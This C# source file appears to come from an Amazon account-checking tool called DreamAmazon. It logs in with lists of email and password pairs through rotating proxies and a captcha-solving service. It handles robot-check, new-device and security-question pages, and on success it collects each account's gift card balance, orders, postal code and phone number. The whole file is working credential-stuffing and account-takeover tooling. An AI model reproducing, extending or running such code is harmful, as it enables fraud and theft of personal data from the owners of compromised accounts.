using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using DreamAmazon.Interfaces;

namespace DreamAmazon
{
    public class StateContext
    {
        public ILogger Logger { get; }
        public IProxyManager ProxyManager { get; protected set; }
        public ICaptchaService CaptchaService { get; protected set; }

        public CheckParams CheckParams { get; protected set; }
        public MetadataFinder MetadataFinder { get; }
        public bool IsDebug { get; }

        private CheckState _currentState;
        private readonly CheckState _loginState;
        private readonly ValidationState _validationState;
        private readonly CaptchaState _captchaState;
        private readonly CheckState _emptyState;
        private readonly RoboState _roboState;

        private readonly ConcurrentStack<CheckState> _previousStates = new ConcurrentStack<CheckState>();

        public StateContext(ILogger logger, IProxyManager proxyManager, ICaptchaService captchaService, MetadataFinder metadataFinder)
        {
            Logger = logger;
            ProxyManager = proxyManager;
            CaptchaService = captchaService;
            MetadataFinder = metadataFinder;

            _loginState = new LoginState(this);
            _validationState = new ValidationState(this);
            _captchaState = new CaptchaState(this);
            _roboState = new RoboState(this);
            _emptyState = EmptyState.Create();
            _currentState = _emptyState;

#if DEBUG
            IsDebug = true;
#endif
        }

        private bool IsFinishState(CheckState state)
        {
            return ReferenceEquals(state, _emptyState);
        }

        public void Handle(CheckParams checkParams, NetHelper nHelper, CancellationToken token)
        {
            CheckParams = checkParams;
            SetLoginState();
            while (!IsFinishState(_currentState))
            {
                if (token.IsCancellationRequested)
                    token.ThrowIfCancellationRequested();

                _currentState.Handle(nHelper);
            }
        }

        public static bool IsCaptchaMsg(string response)
        {
            return response.Contains(Globals.CAPTCHA_MSG);
        }

        public static bool IsBadLog(string response)
        {
            foreach (var s in Globals.BADLOG_MSG)
            {
                if (response.Contains(s))
                {
                    return true;
                }
            }
            return false;
        }

        public bool IsError(Result<string> response)
        {
            var result = response.Failure;
            if (result)
            {
                var msg = response.Error;
                if (IsDebug)
                {
                    Debug(msg);
                }
                Logger.Debug(msg);
            }
            return result;
        }

        public static bool IsCookiesDisabled(string response)
        {
            return response.Contains("enable cookies in your Web browser.");
        }

        public static bool IsSecurityQuestion(string response)
        {
            return response.Contains("security questions");
        }

        public static bool IsAskCredentials(string response)
        {
            return response.Contains("By signing in you are agreeing to our");
        }

        public static bool IsAnotherDevice(string response)
        {
            return response.Contains("We haven't seen you using this device before");
        }

        public static bool IsRoboCheck(string response)
        {
            return response.Contains("we just need to make sure you're not a robot");
        }

        public static Dictionary<string, string> ParseAccountAttributes(string response, Account account, string metadata)
        {
            Regex attributesRegex = new Regex(Globals.REGEX, RegexOptions.Multiline | RegexOptions.IgnoreCase);
            var random = new Random();
            var attributes = new Dictionary<string, string>
            {
                {"email", account.Email},
                {"create", "0"},
                {"password", account.Password},
                {"x", random.Next(1, 201).ToString()},
                {"y", random.Next(1, 22).ToString()},
                {"metadata1", metadata}
            };

            foreach (Match match in attributesRegex.Matches(response))
            {
                if (match.Groups.Count < 3)
                    continue;

                var key = match.Groups[1].Value;
                var val = match.Groups[2].Value;

                attributes.Add(key, val);
            }

            return attributes;
        }

        public void GatherInformation(NetHelper nHelper, Account account)
        {
            Logger.Debug("gather information:" + account.Email);

            var tasks =
                new List<Task>(new[]
                {
                    GatherGiftCardBalanceAsync(nHelper, account),
                    GatherOrdersAsync(nHelper, account),
                    GatherAddyInfosAsync(nHelper, account)
                });

            try
            {
                Task.WhenAll(tasks).Wait();
            }
            catch (Exception exception)
            {
                Logger.Debug("error while GatherInformation:" + account.Email);
                Logger.Error(exception);
            }
        }

        public async Task GatherAddyInfosAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var addyIdResult = nHelper.GET(Globals.ADDY_URL);
                if (addyIdResult.Failure)
                {
                    account.ZipCode = "N/A";
                    account.Phone = "N/A";
                    return;
                }


                try
                {
                    string addyId = Regex.Match(addyIdResult.Value, Globals.REGEX.Replace(" />", ">")).Groups[2].Value;

                    var addyInfoResult = nHelper.GET(string.Format(Globals.FULLADDY_URL, addyId));

                    if (addyInfoResult.Failure)
                        throw new ApplicationException(addyInfoResult.Error);
                    
                    //account.ZipCode = HtmlParser.GetElementValueById(addyInfos, "enterAddressPostalCode");
                    //account.Phone = HtmlParser.GetElementValueById(addyInfos, "enterAddressPhoneNumber");

                    Regex attributesRegex = new Regex(Globals.REGEX, RegexOptions.Multiline | RegexOptions.IgnoreCase);

                    foreach (Match m in attributesRegex.Matches(addyInfoResult.Value))
                    {
                        var addy = m.Groups[1].Value;
                        if (addy == "oldPostalCode")
                            account.ZipCode = m.Groups[2].Value;
                        else if (addy == "oldPhoneNumber")
                            account.Phone = m.Groups[2].Value;
                        else
                            Logger.Info($"unknown ADDY info:'{addy}'");
                    }
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather addy info");
                    Logger.Error(exception);

                    account.ZipCode = "N/A";
                    account.Phone = "N/A";
                }
            });
            await task;
        }

        private async Task GatherOrdersAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var getResult = nHelper.GET(Globals.ORDERS_URL);
                if (getResult.Failure)
                {
                    account.Orders = "N/A";
                    return;
                }

                try
                {
                    account.Orders = Regex.Match(getResult.Value, Globals.ORDERS_REGEX).Groups[1].Value;
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather Orders");
                    Logger.Error(exception);

                    account.Orders = "N/A";
                }
            });
            await task;
        }

        private async Task GatherGiftCardBalanceAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var getResult = nHelper.GET(Globals.GC_URL);
                if (getResult.Failure)
                {
                    account.GiftCardBalance = "N/A";
                    return;
                }

                try
                {
                    account.GiftCardBalance = Regex.Match(getResult.Value, Globals.GC_REGEX).Groups[1].Value;
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather GiftCardBalance");
                    Logger.Error(exception);

                    account.GiftCardBalance = "N/A";
                }
            });
            await task;
        }

        public delegate void CheckCompletedDelegate(StateContext context, CheckResults results, CheckParams checkParams);
        public event CheckCompletedDelegate OnCheckCompleted;

        private void FireOnCheckCompleted(CheckResults results)
        {
            var evt = OnCheckCompleted;
            evt?.Invoke(this, results, CheckParams);
        }

        public void Debug(string value)
        {
            System.Diagnostics.Trace.WriteLine(value);
        }

        public void SetPreviousState()
        {
            var state = GetPreviousState();
            if (state != null)
                _currentState = state;
        }

        public void SetPreviousState(string response)
        {
            var state = GetPreviousState();
            if (state != null)
            {
                _currentState = state;
                _currentState.Init(response);
            }
        }

        private CheckState GetPreviousState()
        {
            CheckState state;
            if (_previousStates.TryPop(out state))
                return state;
            return null;
        }

        private void SaveCurrentState()
        {
            _previousStates.Push(_currentState);
        }

        public void SetLoginState()
        {
            SaveCurrentState();
            _currentState = _loginState;
        }

        public void SetValidationState(string response)
        {
            SaveCurrentState();
            _validationState.Init(response);
            _currentState = _validationState;
        }

        public void SetCaptchaState(string response)
        {
            SaveCurrentState();
            _captchaState.Init(response);
            _currentState = _captchaState;
        }

        public void SetRoboState(string response)
        {
            SaveCurrentState();
            _roboState.Init(response);
            _currentState = _roboState;
        }

        public void SetFinishState(CheckResults results)
        {
            SaveCurrentState();
            _currentState = _emptyState;
            FireOnCheckCompleted(results);
        }
    }
}